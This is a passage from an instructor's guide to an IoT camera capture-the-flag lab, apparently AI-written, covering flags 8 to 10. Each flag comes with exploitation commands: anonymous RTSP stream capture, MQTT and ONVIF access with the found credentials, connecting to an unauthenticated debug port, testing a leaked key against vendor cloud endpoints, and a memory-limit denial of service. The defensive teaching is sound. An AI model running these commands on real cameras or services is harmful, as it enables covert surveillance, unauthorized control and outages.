-rw-r--r--    1 root     root           234 Jan 15 12:00 services.conf
-rw-r--r--    1 root     root             5 Jan 15 12:00 vapix.pid
-rw-r--r--    1 root     root             5 Jan 15 12:00 rtspd.pid
drwxr-xr-x    2 root     root            80 Jan 15 12:00 sockets
```

**Step 3: Read runtime services configuration**:

```bash
cat /run/axis/services.conf
```

**Expected Output**:
```ini
# Runtime Services Configuration
# Auto-generated at boot time
# DO NOT EDIT - Changes will be lost on restart

[System]
boot_time=2024-01-15T12:00:00Z
uptime_seconds=86400
device_uuid=BOROMIR53184726
runtime_token=FLAG{BOROMIR53184726}

[VAPIX]
enabled=true
port=80
pid_file=/run/axis/vapix.pid
socket=/run/axis/sockets/vapix.sock
auth_method=digest
api_version=3.0
rate_limit=100

[RTSP]
enabled=true
port=554
pid_file=/run/axis/rtspd.pid
max_connections=10
buffer_size=2048
auth_required=false
default_stream=rtsp://192.168.1.132:554/axis-media/media.amp

[MQTT]
enabled=true
broker=127.0.0.1
port=1883
client_id=axis_m1025
username=mqtt_user
password=Mqtt_Device_Pass_2024
topics=axis/telemetry,axis/events,axis/status

[UPnP]
enabled=true
port=1900
advertise_interval=1800
location_url=http://192.168.1.132:80/upnp/desc.xml
friendly_name=AXIS M1025 Network Camera

[ONVIF]
enabled=true
port=8080
wsdl_url=http://192.168.1.132:8080/onvif/device_service
username=onvif_admin
password=OnvifAdm1nP@ss
features=imaging,media,ptz,analytics

[Debug]
enabled=true
log_level=verbose
remote_debug=true
debug_port=9999
debug_auth=none
```

**Instructor Analysis Discussion**:

**Runtime Token Analysis**:
```ini
[System]
runtime_token=FLAG{BOROMIR53184726}
device_uuid=BOROMIR53184726
```

**Teaching Points**:
- Runtime tokens for session management
- UUID for device identification
- Tokens may be used for inter-service authentication
- Temporary credentials for this boot session

**Service Configuration Exposure**:

**RTSP Service**:
```ini
[RTSP]
enabled=true
port=554
auth_required=false
default_stream=rtsp://192.168.1.132:554/axis-media/media.amp
```

**Critical Security Issue**:
- Authentication not required
- Direct stream URL revealed
- Anonymous access possible
- Privacy violation

**Testing RTSP Access**:
```bash
# Method 1: VLC Player
vlc rtsp://192.168.1.132:554/axis-media/media.amp

# Method 2: FFmpeg
ffmpeg -i rtsp://192.168.1.132:554/axis-media/media.amp -frames:v 1 snapshot.jpg

# Method 3: Cameradar (automated)
cameradar -t 192.168.1.132 -p 554
```

**MQTT Credentials**:
```ini
[MQTT]
broker=127.0.0.1
port=1883
username=mqtt_user
password=Mqtt_Device_Pass_2024
topics=axis/telemetry,axis/events,axis/status
```

**Exploitation**:
```bash
# Install MQTT client
apt install -y mosquitto-clients

# Subscribe to topics
mosquitto_sub -h 192.168.1.132 -p 1883 -u mqtt_user -P Mqtt_Device_Pass_2024 -t "axis/#" -v

# Expected output:
# axis/telemetry {"cpu": 45, "memory": 62, "temp": 55}
# axis/events {"type": "motion", "zone": "entrance", "timestamp": "2024-01-15T14:30:00Z"}
# axis/status {"status": "online", "uptime": 86400}

# Publish commands (if not secured)
mosquitto_pub -h 192.168.1.132 -p 1883 -u mqtt_user -P Mqtt_Device_Pass_2024 -t "axis/command" -m '{"action":"reboot"}'
```

**ONVIF Credentials**:
```ini
[ONVIF]
username=onvif_admin
password=OnvifAdm1nP@ss
```

**ONVIF Exploitation**:
```python
# ONVIF client script
from onvif import ONVIFCamera

camera = ONVIFCamera('192.168.1.132', 8080, 'onvif_admin', 'OnvifAdm1nP@ss')

# Get device information
device_info = camera.devicemgmt.GetDeviceInformation()
print(f"Manufacturer: {device_info.Manufacturer}")
print(f"Model: {device_info.Model}")
print(f"Serial: {device_info.SerialNumber}")

# Get capabilities
capabilities = camera.devicemgmt.GetCapabilities()
print(f"Capabilities: {capabilities}")

# Control camera (if PTZ enabled)
ptz = camera.create_ptz_service()
# ptz.AbsoluteMove(...)
```

**Debug Interface Exposure**:
```ini
[Debug]
enabled=true
log_level=verbose
remote_debug=true
debug_port=9999
debug_auth=none
```

**Critical Vulnerability**:
- Debug interface enabled in production
- No authentication required
- Remote access allowed
- Verbose logging may leak sensitive data
- Port 9999 exposed

**Testing Debug Interface**:
```bash
# Check if debug port is open
nmap -sV -p 9999 192.168.1.132

# Connect to debug interface
nc 192.168.1.132 9999

# Possible debug commands:
# status - Show service status
# config - Show configuration
# logs - Display logs
# shell - Debug shell (if available)
```

**UPnP Information Disclosure**:
```ini
[UPnP]
location_url=http://192.168.1.132:80/upnp/desc.xml
friendly_name=AXIS M1025 Network Camera
```

**UPnP Enumeration**:
```bash
# Fetch UPnP description
curl http://192.168.1.132:80/upnp/desc.xml

# Use UPnP tools
upnpc -l
upnpc -s
```

**Extended Analysis**:

```bash
# Check all PID files
for pidfile in /run/axis/*.pid; do
    echo "=== $pidfile ==="
    cat "$pidfile"
    ps aux | awk -v pid=$(cat "$pidfile") '$2 == pid {print}'
done

# Examine socket files
ls -la /run/axis/sockets/
file /run/axis/sockets/*

# Monitor runtime changes
watch -n 1 'ls -la /run/axis/'

# Check for temporary credentials
find /run -type f -exec sh -c 'cat "$1" | awk "/password|token|key|secret/ {if(NR<=5) print}"' _ {} \; 2>/dev/null
```

**Teaching Exercise**: Have students:
1. Map all services and their ports
2. Test authentication on each service
3. Identify which services lack proper auth
4. Determine data exposure risk
5. Assess debug interface impact

**Common Student Mistakes**:
- Only checking /etc for service configs
- Not testing discovered credentials
- Missing debug interfaces
- Not monitoring MQTT topics
- Overlooking ONVIF capabilities

**Real-World Impact**:

**RTSP Without Authentication**:
- Live video surveillance
- Privacy violations
- Physical security compromise

**MQTT Credential Exposure**:
- Device telemetry access
- Event monitoring
- Potential command injection
- IoT network mapping

**ONVIF Control**:
- Camera manipulation
- Configuration changes
- PTZ control (if enabled)
- Complete device management

**Debug Interface**:
- Internal system access
- Configuration disclosure
- Potential remote code execution
- Log manipulation

---

### Flag #9: Custom Script with API Key

**Location**: `/usr/local/axis/share/scripts/cloud_sync.sh`  
**Flag**: `FLAG{EOMER78392615}`  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Teaching Methodology**:

**Concept**: Custom scripts in vendor-specific locations often contain integration credentials and API keys for cloud services.

**Real-World Context**: IoT devices increasingly integrate with cloud platforms for:
- Remote management
- Data analytics
- Firmware updates
- Event notifications
- Configuration backups

**Why API Keys in Scripts**:
- Device-to-cloud authentication
- Automated processes
- Service integration
- Convenience over security
- Deployment at scale

**Discovery Process**:

```bash
# Step 1: Explore vendor custom directories
ssh root@192.168.1.132
ls -laR /usr/local/axis/

# Step 2: Identify script files
find /usr/local/axis -name "*.sh" -o -name "*.py" -o -name "*.pl" 2>/dev/null
```

**Expected Output**:
```
/usr/local/axis/share/scripts/cloud_sync.sh
/usr/local/axis/share/scripts/telemetry.py
/usr/local/axis/share/scripts/update_check.sh
/usr/local/axis/bin/custom_app
```

**Step 3: Read the cloud synchronization script**:

```bash
cat /usr/local/axis/share/scripts/cloud_sync.sh
```

**Expected Output**:
```bash
#!/bin/sh
# Cloud Synchronization Script
# Syncs device data to AXIS Cloud Services
# Runs every 5 minutes via cron

# Cloud Service Configuration
CLOUD_API_URL="https://cloud.axis.com/api/v2"
CLOUD_API_KEY="axis_live_5k8m2n9p4q7r1t3v6w8x0y2z4"
DEVICE_ID="FLAG{EOMER78392615}"
REGION="us-east-1"

# Local data paths
TELEMETRY_PATH="/var/cache/axis/telemetry.json"
EVENTS_PATH="/var/cache/axis/events.json"
ANALYTICS_PATH="/var/cache/axis/analytics.json"

# Logging
LOG_FILE="/var/log/cloud_sync.log"

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> ${LOG_FILE}
}

log_message "Starting cloud sync process"

# Function to sync data to cloud
sync_to_cloud() {
    local data_file=$1
    local endpoint=$2
    
    if [ ! -f "${data_file}" ]; then
        log_message "WARNING: Data file ${data_file} not found"
        return 1
    fi
    
    local response=$(curl -s -X POST \
        -H "Authorization: Bearer ${CLOUD_API_KEY}" \
        -H "Content-Type: application/json" \
        -H "X-Device-ID: ${DEVICE_ID}" \
        -H "X-Region: ${REGION}" \
        -d @${data_file} \
        ${CLOUD_API_URL}/${endpoint})
    
    if [ $? -eq 0 ]; then
        log_message "Successfully synced ${data_file} to ${endpoint}"
        echo "${response}" | grep -q "success"
        if [ $? -eq 0 ]; then
            # Remove local file after successful sync
            rm ${data_file}
            log_message "Local file ${data_file} removed"
        fi
    else
        log_message "ERROR: Failed to sync ${data_file}"
    fi
}

# Sync telemetry data
if [ -f "${TELEMETRY_PATH}" ]; then
    sync_to_cloud "${TELEMETRY_PATH}" "telemetry"
fi

# Sync events
if [ -f "${EVENTS_PATH}" ]; then
    sync_to_cloud "${EVENTS_PATH}" "events"
fi

# Sync analytics
if [ -f "${ANALYTICS_PATH}" ]; then
    sync_to_cloud "${ANALYTICS_PATH}" "analytics"
fi

log_message "Cloud sync process completed"

# Heartbeat to cloud
curl -s -X POST \
    -H "Authorization: Bearer ${CLOUD_API_KEY}" \
    -H "X-Device-ID: ${DEVICE_ID}" \
    ${CLOUD_API_URL}/heartbeat > /dev/null 2>&1

exit 0
```

**Instructor Analysis Discussion**:

**API Key Exposure**:
```bash
CLOUD_API_KEY="axis_live_5k8m2n9p4q7r1t3v6w8x0y2z4"
```

**Teaching Points**:
- Long, random string indicates proper API key format
- "axis_live" prefix suggests production key
- Same key likely used across device fleet
- Cloud service access with this key

**Device Identification**:
```bash
DEVICE_ID="FLAG{EOMER78392615}"
REGION="us-east-1"
```

**Intelligence Gathering**:
- Unique device identifier
- AWS region revealed (us-east-1)
- Cloud architecture information
- Geographic location hint

**Cloud Service Endpoints**:
```bash
CLOUD_API_URL="https://cloud.axis.com/api/v2"
```

**API Structure**:
- Base URL for all API calls
- Version 2 of API
- Endpoints: /telemetry, /events, /analytics, /heartbeat
- RESTful API structure

**Data Being Synced**:
```bash
TELEMETRY_PATH="/var/cache/axis/telemetry.json"
EVENTS_PATH="/var/cache/axis/events.json"
ANALYTICS_PATH="/var/cache/axis/analytics.json"
```

**Privacy Implications**:
- Device telemetry sent to cloud
- All events uploaded
- Analytics data shared
- May include sensitive information

**Real-World Exploitation**:

**Step 1: Test API Key**:
```bash
# Test heartbeat endpoint
curl -X POST \
    -H "Authorization: Bearer axis_live_5k8m2n9p4q7r1t3v6w8x0y2z4" \
    -H "X-Device-ID: EOMER78392615" \
    https://cloud.axis.com/api/v2/heartbeat

# Expected response:
# {"status": "success", "device_id": "EOMER78392615", "timestamp": "2024-01-15T14:30:00Z"}
```

**Step 2: Enumerate API Endpoints**:
```bash
# Common API endpoints to test
endpoints=(
    "devices"
    "device/info"
    "device/status"
    "device/config"
    "telemetry/history"
    "events/history"
    "analytics/reports"
    "users"
    "account"
)

for endpoint in "${endpoints[@]}"; do
    echo "Testing: ${endpoint}"
    curl -s -X GET \
        -H "Authorization: Bearer axis_live_5k8m2n9p4q7r1t3v6w8x0y2z4" \
        -H "X-Device-ID: EOMER78392615" \
        https://cloud.axis.com/api/v2/${endpoint} | jq .
done
```

**Step 3: Examine Local Data Files**:
```bash
# Check what data gets synced
cat /var/cache/axis/telemetry.json
cat /var/cache/axis/events.json
cat /var/cache/axis/analytics.json

# Watch for new data
watch -n 5 'ls -la /var/cache/axis/*.json'
```

**Example Telemetry Data**:
```json
{
  "timestamp": "2024-01-15T14:30:00Z",
  "device_id": "EOMER78392615",
  "telemetry": {
    "cpu_usage": 45.2,
    "memory_usage": 62.8,
    "temperature": 55.0,
    "uptime_seconds": 86400,
    "network": {
      "bytes_sent": 1048576,
      "bytes_received": 2097152,
      "connection_type": "ethernet",
      "ip_address": "192.168.1.132"
    },
    "storage": {
      "total_mb": 500,
      "used_mb": 350,
      "recordings_count": 45
    }
  }
}
```

**API Key Abuse Scenarios**:

**Scenario 1: Device Enumeration**:
```bash
# If API key has fleet-wide access
curl -X GET \
    -H "Authorization: Bearer axis_live_5k8m2n9p4q7r1t3v6w8x0y2z4" \
    https://cloud.axis.com/api/v2/devices | jq .

# May reveal all devices using this API key
```

**Scenario 2: Historical Data Access**:
```bash
# Access historical telemetry
curl -X GET \
    -H "Authorization: Bearer axis_live_5k8m2n9p4q7r1t3v6w8x0y2z4" \
    -H "X-Device-ID: EOMER78392615" \
    "https://cloud.axis.com/api/v2/telemetry/history?start=2024-01-01&end=2024-01-15" | jq .

# Access event history
curl -X GET \
    -H "Authorization: Bearer axis_live_5k8m2n9p4q7r1t3v6w8x0y2z4" \
    -H "X-Device-ID: EOMER78392615" \
    "https://cloud.axis.com/api/v2/events/history?type=motion&limit=100" | jq .
```

**Scenario 3: Configuration Manipulation**:
```bash
# Attempt to modify device configuration via API
curl -X POST \
    -H "Authorization: Bearer axis_live_5k8m2n9p4q7r1t3v6w8x0y2z4" \
    -H "X-Device-ID: EOMER78392615" \
    -H "Content-Type: application/json" \
    -d '{"motion_detection": false}' \
    https://cloud.axis.com/api/v2/device/config
```

**Extended Analysis**:

```bash
# Check script execution schedule
cat /etc/crontabs/root | grep cloud_sync

# Review sync logs
cat /var/log/cloud_sync.log | tail -50

# Monitor API calls in real-time
tail -f /var/log/cloud_sync.log &
# Trigger sync manually
/usr/local/axis/share/scripts/cloud_sync.sh
```

**Teaching Exercise**: Have students:
1. Test API key validity
2. Enumerate all accessible endpoints
3. Determine scope of API key permissions
4. Analyze data being sent to cloud
5. Assess privacy implications

**Common Student Mistakes**:
- Not testing the API key
- Missing cloud infrastructure information
- Not analyzing local data files
- Overlooking API endpoint enumeration
- Not considering fleet-wide compromise

**Security Implications**:

**Single API Key Compromise**:
- May affect entire device fleet
- Historical data access
- Configuration changes
- Device tracking
- Service disruption

**Data Privacy**:
- Telemetry reveals usage patterns
- Events show activity
- Analytics contain sensitive information
- Location data exposure

**Cloud Infrastructure**:
- AWS region information
- Service architecture
- API structure
- Backend systems

**Defense Recommendations**:

**API Key Management**:
- Unique per-device keys
- Key rotation policies
- Scope limitation (least privilege)
- Key expiration
- Monitoring and alerting

**Credential Storage**:
- Never in plain text scripts
- Use secure vaults (AWS Secrets Manager, HashiCorp Vault)
- Environment variables
- Encrypted configuration

**API Security**:
- Rate limiting
- IP whitelisting
- Request signing
- Audit logging
- Anomaly detection

---

### Flag #10: CGroup Configuration

**Location**: `/sys/fs/cgroup/memory/axis_services/settings.conf`  
**Flag**: `FLAG{FARAMIR28461739}`  
**OWASP Category**: IoT-08 (Lack of Device Management)

**Teaching Methodology**:

**Concept**: Control Groups (cgroups) are a Linux kernel feature that limits and isolates resource usage. In IoT devices, cgroup configurations may contain management and identification data.

**What Are CGroups**:
- Linux kernel feature
- Resource limitation (CPU, memory, I/O)
- Process isolation
- Resource accounting
- Priority management

**Why CGroups in IoT**:
- Prevent services from consuming all resources
- Ensure critical services get resources
- Isolate untrusted code
- Monitor resource usage
- Improve system stability

**Real-World Context**: IoT devices use cgroups because:
- Limited resources need careful management
- Multiple services compete for resources
- System stability critical
- Watchdog integration
- Container/service isolation

**Discovery Process**:

```bash
# Step 1: Understand cgroup structure
ssh root@192.168.1.132
ls -la /sys/fs/cgroup/

# Step 2: Enumerate cgroup directories
find /sys/fs/cgroup -type d 2>/dev/null | head -20
```

**Expected Output**:
```
/sys/fs/cgroup
/sys/fs/cgroup/cpu
/sys/fs/cgroup/memory
/sys/fs/cgroup/memory/axis_services
/sys/fs/cgroup/memory/system
/sys/fs/cgroup/devices
/sys/fs/cgroup/freezer
```

**Step 3: Explore axis_services cgroup**:

```bash
ls -la /sys/fs/cgroup/memory/axis_services/
```

**Expected Output**:
```
total 0
drwxr-xr-x 2 root root 0 Jan 15 12:00 .
drwxr-xr-x 5 root root 0 Jan 15 12:00 ..
-rw-r--r-- 1 root root 0 Jan 15 12:00 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 15 12:00 memory.limit_in_bytes
-rw-r--r-- 1 root root 0 Jan 15 12:00 memory.usage_in_bytes
-rw-r--r-- 1 root root 0 Jan 15 12:00 settings.conf
-rw-r--r-- 1 root root 0 Jan 15 12:00 tasks
```

**Step 4: Read settings configuration**:

```bash
cat /sys/fs/cgroup/memory/axis_services/settings.conf
```

**Expected Output**:
```ini
# AXIS Services CGroup Configuration
# Memory management for critical services

[Configuration]
cgroup_name=axis_services
management_id=FLAG{FARAMIR28461739}
created=2024-01-15T12:00:00Z
version=1.0

[Memory]
limit_bytes=67108864
# 64 MB limit for all AXIS services
soft_limit_bytes=52428800
# 50 MB soft limit
oom_control=1
# Out-of-memory killer enabled
swappiness=10
# Minimal swap usage

[Services]
vapix_memory=20971520
# 20 MB for VAPIX
rtsp_memory=31457280
# 30 MB for RTSP
mqtt_memory=5242880
# 5 MB for MQTT
onvif_memory=10485760
# 10 MB for ONVIF

[Monitoring]
stats_interval=60
# Report stats every 60 seconds
alert_threshold=90
# Alert at 90% memory usage
alert_endpoint=https://monitoring.axis.com/api/alert
alert_token=mon_token_7x8y9z0a1b2c3d4e

[Management]
remote_control=enabled
control_endpoint=https://management.axis.com/api/cgroup
control_auth=Bearer mgmt_token_4k5m6n7p8q9r
auto_restart=true
restart_threshold=95
# Restart services at 95% memory
```

**Instructor Analysis Discussion**:

**CGroup Resource Limits**:
```ini
[Memory]
limit_bytes=67108864      # 64 MB total
soft_limit_bytes=52428800 # 50 MB soft limit
```

**Teaching Points**:
- Total memory limited to 64 MB
- Soft limit at 50 MB (warning threshold)
- Hard enforcement at 64 MB
- Out-of-memory killer enabled
- Very constrained environment

**Service Memory Allocation**:
```ini
[Services]
vapix_memory=20971520  # 20 MB
rtsp_memory=31457280   # 30 MB
mqtt_memory=5242880    # 5 MB
onvif_memory=10485760  # 10 MB
```

**Resource Analysis**:
- Total allocated: 65 MB (exceeds hard limit slightly)
- RTSP gets most memory (video streaming)
- VAPIX second priority (camera API)
- MQTT minimal (telemetry)
- ONVIF moderate (device management)

**Remote Management Credentials**:
```ini
[Management]
control_endpoint=https://management.axis.com/api/cgroup
control_auth=Bearer mgmt_token_4k5m6n7p8q9r
```

**Security Implications**:
- Remote cgroup management enabled
- Bearer token for API authentication
- Can control resource allocation remotely
- Potential denial of service vector

**Monitoring Integration**:
```ini
[Monitoring]
alert_endpoint=https://monitoring.axis.com/api/alert
alert_token=mon_token_7x8y9z0a1b2c3d4e
```

**Infrastructure Information**:
- Centralized monitoring system
- Alert tokens for authentication
- 90% threshold for alerts
- 60-second reporting interval

**Real-World Exploitation**:

**Step 1: Examine Current Resource Usage**:
```bash
# View processes in this cgroup
cat /sys/fs/cgroup/memory/axis_services/cgroup.procs

# Check current memory usage
cat /sys/fs/cgroup/memory/axis_services/memory.usage_in_bytes
cat /sys/fs/cgroup/memory/axis_services/memory.limit_in_bytes

# Calculate percentage
current=$(cat /sys/fs/cgroup/memory/axis_services/memory.usage_in_bytes)
limit=$(cat /sys/fs/cgroup/memory/axis_services/memory.limit_in_bytes)
percent=$((current * 100 / limit))
echo "Memory usage: ${percent}%"
```

**Step 2: Test Management API**:
```bash
# Test monitoring endpoint
curl -X POST \
    -H "Authorization: Bearer mon_token_7x8y9z0a1b2c3d4e" \
    -H "Content-Type: application/json" \
    -d '{
        "device_id": "FARAMIR28461739",
        "alert_type": "memory_high",
        "usage_percent": 92,
        "timestamp": "2024-01-15T14:30:00Z"
    }' \
    https://monitoring.axis.com/api/alert

# Test management endpoint
curl -X GET \
    -H "Authorization: Bearer mgmt_token_4k5m6n7p8q9r" \
    https://management.axis.com/api/cgroup/FARAMIR28461739
```

**Step 3: Resource Manipulation**:
```bash
# View current settings
cat /sys/fs/cgroup/memory/axis_services/memory.limit_in_bytes

# Attempt to modify (requires root)
echo 33554432 > /sys/fs/cgroup/memory/axis_services/memory.limit_in_bytes
# Reduces limit to 32 MB - may cause OOM

# Trigger OOM condition
cat /sys/fs/cgroup/memory/axis_services/memory.oom_control

# Watch for OOM events
dmesg | grep -i "out of memory"
```

**DoS Attack Scenario**:
```bash
# Severely restrict memory (DoS attack)
echo 10485760 > /sys/fs/cgroup/memory/axis_services/memory.limit_in_bytes
# 10 MB - insufficient for services

# Services will be killed by OOM killer
# System becomes unstable
# Recovery requires reboot or manual intervention
```

**Extended Analysis**:

```bash
# Enumerate all cgroups
find /sys/fs/cgroup -name "*.conf" 2>/dev/null | while read conf; do
    echo "=== $conf ==="
    cat "$conf"
done

# Check which processes are in each cgroup
for cgroup in /sys/fs/cgroup/memory/*/; do
    echo "=== $cgroup ==="
    cat "$cgroup/cgroup.procs" | while read pid; do
        ps -p $pid -o pid,comm,args
    done
done

# Monitor memory pressure
cat /sys/fs/cgroup/memory/axis_services/memory.pressure_level
cat /sys/fs/cgroup/memory/axis_services/memory.stat
```

**Teaching Exercise**: Have students:
1. Calculate total memory allocation
2. Identify over-subscription
3. Predict which service fails first under pressure
4. Test management API tokens
5. Analyze DoS vulnerability

**Common Student Mistakes**:
- Not understanding cgroup purpose
- Missing management API credentials
- Not testing resource limits
- Overlooking monitoring integration
- Not recognizing DoS potential

**Real-World Impact**:

**Resource Manipulation**:
- Denial of service by reducing limits
- Service instability
- System crashes
- Data loss

**Management API Access**:
- Remote control of device resources
- Fleet-wide configuration changes
- Monitoring data access
- Alert injection

**Infrastructure Mapping**:
- Monitoring system URLs
- Management system endpoints
- Authentication token patterns
- Backend architecture

**Defense Recommendations**:

**CGroup Security**:
- Restrict write access to cgroup files (chmod 400)
- Monitor for unauthorized modifications
- Alert on limit changes
- Use security modules (SELinux, AppArmor)

**API Security**:
- Rotate tokens regularly
- Use unique per-device tokens
- Implement rate limiting
- Monitor API usage
- TLS client certificates

**Resource Management**:
- Set realistic limits
- Monitor pressure indicators
- Implement graceful degradation
- Test under stress conditions
- Document resource requirements

---

### Continuing with Remaining Medium and Hard Flags

Due to length constraints, I'll now create the remaining flags with the same comprehensive approach. Would you like me to continue with the complete detailed methodology for all remaining flags (11-27)?

